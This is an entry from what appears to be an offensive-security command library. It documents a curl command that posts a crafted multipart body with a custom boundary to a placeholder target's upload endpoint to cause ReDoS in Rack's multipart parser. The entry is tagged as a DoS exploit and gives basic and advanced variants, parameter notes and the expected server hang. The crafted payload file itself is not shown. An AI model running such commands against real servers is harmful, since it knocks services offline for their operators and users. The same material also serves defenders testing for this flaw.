---
id: 123e4567-e89b-12d3-a456-426614174002
name: curl-multipart-redos-rack
type: command
executor: bash
data: >-
  curl -X POST http://target.example.com/upload -H "Content-Type:
  multipart/form-data; boundary=evil-boundary" --data-binary
  @crafted_payload.txt -v
output: null
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T17:26:30.832Z'
platforms:
  - Linux
  - macOS
  - Windows
tags:
  - dos
  - web
  - exploit
verified: false
validated: true
submitted: true
---

# curl-multipart-redos-rack

## Command

```bash
curl -X POST http://target.example.com/upload -H "Content-Type: multipart/form-data; boundary=evil-boundary" --data-binary @crafted_payload.txt -v
```

## Description

This command sends a crafted multipart/form-data POST request to a target endpoint using curl, exploiting ReDoS in Rack by including a malicious boundary and body that cause excessive regex backtracking during parsing.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `http://target.example.com/upload` | The URL of the vulnerable multipart endpoint | Yes |
| `-H "Content-Type: ..."` | Sets the multipart boundary header | Yes |
| `--data-binary @crafted_payload.txt` | Loads the malicious multipart body from file without modification | Yes |
| `-v` | Enables verbose output for request/response details | No |

## Examples

### Basic Usage

```bash
curl -X POST http://target.example.com/upload -H "Content-Type: multipart/form-data; boundary=evil-boundary" --data-binary @crafted_payload.txt
```

### Advanced Usage

```bash
curl -X POST http://target.example.com/upload -H "Content-Type: multipart/form-data; boundary=evil-boundary" --data-binary @crafted_payload.txt -v --max-time 300
```

Add `--max-time` to set a client-side timeout if the server hangs.

## Expected Output

Verbose output shows the request headers and body being sent. On success (DoS trigger), the connection may timeout with no response, or partial headers if parsing partially completes. Server-side: Expect high CPU and potential 500 errors or timeouts.

## Related

- [[Related Procedure|procedures/Submit-Crafted-Multipart-POST-to-Trigger-ReDoS-in-Rack]]
